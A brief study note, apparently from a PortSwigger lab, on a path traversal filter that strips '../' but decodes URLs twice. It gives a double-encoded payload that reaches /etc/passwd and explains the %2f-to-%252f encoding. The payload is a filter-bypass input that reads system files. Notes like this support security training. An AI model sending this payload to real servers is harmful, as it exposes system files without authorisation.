# File path traversal, traversal sequences stripped with superfluous URL-decode

Source: Portswigger
Tools: Burpsuite
Technique: Path Traversal
Fields: Web

- ..%252f..%252f..%252fetc/passwd
- encode / → %2f → %252f